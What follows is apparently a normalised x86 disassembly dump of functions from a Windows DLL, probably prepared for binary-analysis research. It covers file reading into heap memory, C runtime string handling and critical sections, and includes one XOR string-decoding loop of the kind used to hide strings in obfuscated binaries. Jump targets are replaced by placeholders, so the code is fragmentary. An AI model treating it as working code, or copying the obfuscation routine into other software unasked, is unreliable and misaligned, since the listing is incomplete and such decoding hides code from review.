push 0x3
push ebx
push ebx
push 0xc0000000
push eax
call [ CreateFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push esi
lea ecx [ ebp - 0x4 ]
push ecx
push edi
mov [ ebp - 0x4 ] ebx
call [ GetFileSize@IAT ]
mov ecx [ ebp - 0x4 ]
mov esi eax
sub esi ecx
cmp eax 0xffffffff
jne r-xdata
pop edi
lea eax [ ebx + 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
push esi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
test eax eax
jne r-xdata
cmp ecx ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
push 0x0
push ecx
push esi
push eax
push edi
call [ ReadFile@IAT ]
cmp eax 0x1
je r-xdata
push edi
lea ebx [ eax + 0x3 ]
call [ CloseHandle@IAT ]
pop esi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov ebx 0x2
call [ CloseHandle@IAT ]
pop esi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push edi
call [ CloseHandle@IAT ]
pop esi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ebx 0x4
sub_100392f0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
mov [ esi ] r--data
test eax eax
jle r-xdata
jns r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_10020a90
jmp r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
push ecx
call sub_1005b4d5
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_10039350
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_1003938d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_1003a017
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_1003fa9e
sub_100393c0
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebp
retn 0x8
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov [ edi ] edx
pop edi
pop esi
pop ebp
retn 0x8
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ edi + 0x4 ] edx
mov [ edi ] eax
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10039430
push ebp
mov ebp esp
push 0xffffffff
push sub_10081342
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ebx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
xor eax eax
mov [ ebp - 0x4 ] 0x1
cmp ebx eax
je r-xdata
mov ecx edi
call sub_10005a90
sub esi eax
mov eax 0x38e38e39
imul esi
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x24
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] eax
push esi
mov ecx ebx
mov [ ebx ] dx
call sub_10051390
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov ecx [ esi + 0x20 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ edi ]
lea eax [ esi + esi * 8 ]
mov esi [ edi + 0x4 ]
lea ebx [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx edi
call sub_10005a90
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push ebx
mov ecx esi
mov [ esi ] dx
call sub_10051390
mov eax [ ebx + 0x1c ]
mov [ esi + 0x1c ] eax
mov ecx [ ebx + 0x20 ]
mov [ esi + 0x20 ] ecx
jmp r-xdata
sub_10039520
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
xor eax eax
push 0xffffffff
push eax
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] ax
call sub_1001c310
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10039550
push ebp
mov ebp esp
push 0xffffffff
push sub_1007e170
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ebx ecx
mov ecx [ ebp + 0x10 ]
xor esi esi
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x50 ] esi
mov ecx 0x7
xor edx edx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
mov [ ebp - 0x18 ] ecx
xor ecx ecx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] cx
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x50 ] eax
cmp [ ebx + 0x48 ] cl
jne r-xdata
push esi
push 0x8
lea ecx [ ebp - 0x48 ]
call sub_10039dd0
mov eax [ ebp - 0x4c ]
mov [ ebx + 0x4c ] esi
cmp eax [ ebp - 0x54 ]
je r-xdata
mov edx [ rw-data ]
mov [ ebx + 0x44 ] edx
mov ebx 0x7
xor edx edx
lea eax [ ebp - 0x2c ]
mov [ edi + 0x14 ] ebx
mov [ edi + 0x10 ] esi
mov [ edi ] dx
cmp edi eax
je r-xdata
cmp [ ebp - 0x34 ] 0x8
mov esi [ ebp - 0x48 ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ebx + 0x4 ]
mov edx [ ecx ]
lea ebx [ ebp - 0x58 ]
push ebx
mov ebx [ ebp - 0x38 ]
lea ebx [ esi + ebx * 2 ]
push ebx
push esi
lea ebx [ ebp - 0x4c ]
push ebx
mov ebx [ ebp - 0x54 ]
push ebx
mov ebx [ ebp - 0x5c ]
push eax
lea eax [ ebx + 0x44 ]
push eax
mov eax [ edx + 0x10 ]
call eax
test eax eax
js r-xdata
lea esi [ ebp - 0x48 ]
xor ecx ecx
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov eax [ ebp - 0x2c ]
push eax
call sub_10065045
add esp 0x4
xor edx edx
mov [ edi + 0x14 ] ebx
mov [ edi + 0x10 ] esi
mov [ edi ] dx
cmp [ ebp - 0x18 ] 0x8
jae r-xdata
mov ecx [ edi ]
push ecx
call sub_10065045
add esp 0x4
cmp [ ebx + 0x4a ] 0x0
je r-xdata
cmp eax 0x1
jle r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x48 ]
push edx
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov [ edi ] eax
mov [ ebp - 0x2c ] esi
mov [ edi + 0x10 ] ecx
mov [ edi + 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x1c ]
lea ecx [ eax + eax + 0x2 ]
push ecx
lea edx [ ebp - 0x2c ]
push edx
push edi
call sub_10077d10
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
add esp 0xc
mov [ edi + 0x10 ] ecx
mov [ edi + 0x14 ] edx
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x50 ] r--data
call sub_10052185
push r--data
lea ecx [ ebp - 0x68 ]
push ecx
mov [ ebp - 0x68 ] r--data
call sub_1002050e
xor edx edx
push 0xffffffff
push edx
mov esi 0x7
add ebx 0x28
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] 0x0
push ebx
mov ecx edi
mov [ edi ] dx
call sub_1001c310
mov ebx 0x8
cmp [ ebp - 0x18 ] ebx
jb r-xdata
mov eax [ ebp - 0x58 ]
cmp esi eax
jae r-xdata
cmp eax 0x3
jne r-xdata
xor ecx ecx
cmp [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10065045
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
cmp [ ebp - 0x38 ] 0x10
jae r-xdata
sub eax esi
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_10023990
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov esi [ ebp - 0x54 ]
cmp eax esi
je r-xdata
mov [ ebp - 0x2c ] cx
jb r-xdata
cmp [ ebx + 0x4a ] 0x0
je r-xdata
push 0x0
push 0x8
lea ecx [ ebp - 0x48 ]
call sub_10039dd0
mov esi [ ebp - 0x54 ]
mov eax [ ebp - 0x4c ]
mov ecx eax
sub ecx [ ebp - 0x50 ]
mov [ ebx + 0x4c ] ecx
cmp eax esi
jne r-xdata
movzx edx [ eax ]
push edx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10039dd0
mov eax [ ebp - 0x4c ]
inc eax
mov [ ebp - 0x4c ] eax
cmp eax esi
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x50 ] r--data
call sub_10052185
push r--data
lea ecx [ ebp - 0x74 ]
push ecx
mov [ ebp - 0x74 ] r--data
call sub_1002050e
xor edx edx
push 0xffffffff
push edx
mov esi 0x7
add ebx 0x28
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] 0x0
push ebx
mov ecx edi
mov [ edi ] dx
call sub_1001c310
mov ebx 0x8
cmp [ ebp - 0x18 ] ebx
jb r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10065045
add esp 0x4
sub_10039853
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x24 ]
xor edi edi
call sub_10054678
mov eax [ ebp - 0x24 ]
mov esi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] edi
mov ebx [ ebp - 0x4 ]
push [ esi + ebx * 4 + 0x1c ]
call sub_10078ac0
push [ esi + ebx * 4 ]
mov [ ebp - 0x14 ] eax
call sub_10078ac0
add eax edi
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x14 ]
lea edi [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ esi + 0x38 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] 0xc
mov ebx [ ebp - 0x10 ]
push [ ebx + 0x30 ]
call sub_10078ac0
push [ ebx ]
mov [ ebp - 0xc ] eax
call sub_10078ac0
add [ ebp - 0x10 ] 0x4
pop ecx
pop ecx
mov ecx [ ebp - 0xc ]
add eax edi
dec [ ebp - 0x14 ]
lea edi [ eax + ecx + 0x2 ]
jne r-xdata
push [ esi + 0x9c ]
call sub_10078ac0
push [ esi + 0x98 ]
mov ebx eax
call sub_10078ac0
push [ esi + 0xa0 ]
add eax edi
lea edi [ eax + ebx + 0x2 ]
call sub_10078ac0
push [ esi + 0xa4 ]
lea edi [ edi + eax + 0x1 ]
call sub_10078ac0
push [ esi + 0xa8 ]
lea edi [ edi + eax + 0x1 ]
call sub_10078ac0
lea eax [ edi + eax + 0x165 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_10028397
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x164
push esi
push ebx
lea edi [ ebx + 0x164 ]
call sub_10078600
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] ebx
add esp 0xc
sub [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] eax
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000b659
push edi
call sub_10078ac0
mov ecx [ ebp - 0x10 ]
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0xc ]
mov [ ecx + eax ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_10005e18
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_10078ac0
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0x14 ]
mov [ eax ] edi
mov eax [ ebp - 0xc ]
push [ eax + 0x30 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_10005e18
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_10078ac0
inc [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x4
cmp [ ebp - 0x4 ] 0x7
pop ecx
lea edi [ edi + eax + 0x1 ]
jb r-xdata
push edi
call sub_10078ac0
inc [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x4
add [ ebp - 0x14 ] 0x4
cmp [ ebp - 0x4 ] 0xc
pop ecx
lea edi [ edi + eax + 0x1 ]
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + eax * 4 ] edi
mov eax [ ebp - 0xc ]
push [ eax - 0x1c ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_10005e18
add esp 0xc
test eax eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebx + 0x68 ]
mov [ ebp - 0x14 ] eax
lea eax [ esi + 0x38 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x98 ] edi
push [ esi + 0x98 ]
push eax
push edi
call sub_10005e18
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax + ecx ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_10005e18
add esp 0xc
test eax eax
jne r-xdata
push edi
call sub_10078ac0
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x9c ] edi
push [ esi + 0x9c ]
push eax
push edi
call sub_10005e18
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_10078ac0
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa0 ] edi
push [ esi + 0xa0 ]
push eax
push edi
call sub_10005e18
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_10078ac0
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa4 ] edi
push [ esi + 0xa4 ]
push eax
push edi
call sub_10005e18
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_10078ac0
lea eax [ edi + eax + 0x1 ]
mov ecx ebx
sub ecx eax
add ecx [ ebp - 0x8 ]
mov [ ebx + 0xa8 ] eax
push [ esi + 0xa8 ]
push ecx
push eax
call sub_10005e18
add esp 0x10
test eax eax
jne r-xdata
sub_10039b3d
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x20
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1002097b
jmp r-xdata
sub_10039bca
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_100551f3
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_10012991
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10039ce0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
push 0x16
pop eax
pop ebp
retn
sub_10039d0d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_10044fed
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_10044fed
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_10039d39
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
movzx edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
call [ eax + 0xc ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
mov al [ ebp + 0x8 ]
mov [ ecx ] al
movzx eax al
jmp r-xdata
test eax eax
jle r-xdata
pop ebp
retn 0x4
sub_10039d7a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_100159e2
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10039dd0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_100616c6
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100616c6
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1000fb70
test edi edi
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
push eax
push ebx
push ecx
mov ecx esi
call sub_1004bdc0
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
pop edi
mov eax esi
xor edx edx
mov [ eax + edi * 2 ] dx
mov eax [ esi ]
xor edx edx
mov [ eax + edi * 2 ] dx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
pop edi
mov eax esi
xor edx edx
pop esi
mov [ eax ] dx
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax ] dx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_10039ea0
push 0x14
mov eax sub_1007e4a0
call sub_1005d45e
mov esi ecx
mov [ ebp - 0x1c ] esi
call sub_1001bc97
xor ebx ebx
mov edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] r--data
jmp r-xdata
call sub_1001a1b3
retn 0x8
call sub_1006312b
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x2e
mov [ ebp - 0x1c ] edx
call sub_1005e05a
mov [ esi + 0xc ] ax
call sub_1006312b
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x2c
mov [ ebp - 0x1c ] edx
call sub_1005e05a
add esp 0x18
mov [ esi + 0xe ] ax
call sub_1006312b
lea eax [ ebp - 0x20 ]
push eax
push ebx
push [ ebp - 0x14 ]
call sub_10047b65
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_1006312b
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
mov [ ebp - 0x14 ] edx
call sub_1001e5b8
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_1006312b
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
mov [ ebp - 0x14 ] edx
call sub_1001e5b8
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_1006312b
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x1c ] edx
movzx eax [ eax ]
push ebx
push eax
call sub_1005e05a
mov [ esi + 0xc ] ax
call sub_1006312b
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x1c ] edx
movzx eax [ eax ]
push ebx
push eax
call sub_1005e05a
add esp 0x18
mov [ esi + 0xe ] ax
cmp [ ebp + 0xc ] bl
je r-xdata
sub_10039fd0
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
pop esi
retn
push eax
call sub_10065045
add esp 0x4
sub_1003a017
push 0xc
push r--data
call sub_10078b50
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_1006a460
push 0x1e
call sub_1005e59c
push 0xff
call sub_10017dcd
push 0x18
call sub_10028397
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_1003938d
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_10012991
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_10078b95
retn
push edi
call sub_10020a90
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_10020a90
pop ecx
call sub_10012991
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003a0d0
mov eax [ ebp - 0x1c ]
sub_1003a0e0
push ebp
mov ebp esp
sub esp 0x70
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x30 ]
push ebx
mov [ ebp - 0x70 ] ecx
lea ecx [ ebp - 0x60 ]
push ecx
xor ebx ebx
push eax
mov [ ebp - 0x60 ] ebx
call edx
test eax eax
jns r-xdata
mov eax [ ebp - 0x60 ]
lea edx [ ebp - 0x6c ]
mov [ ebp - 0x6c ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x6c ]
cmp eax ebx
jne r-xdata
lea eax [ ebx + 0x1 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
push edi
xor edi edi
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x7
call sub_1000a6f0
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x60 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
push esi
lea edx [ ebp - 0x38 ]
mov eax 0xba
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x68 ] ebx
call sub_100070c0
test eax eax
je r-xdata
inc edi
cmp edi [ ebp - 0x6c ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov esi [ ebp - 0x68 ]
mov eax [ ebp - 0x70 ]
push esi
add eax 0x54
call sub_1002e630
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x68 ]
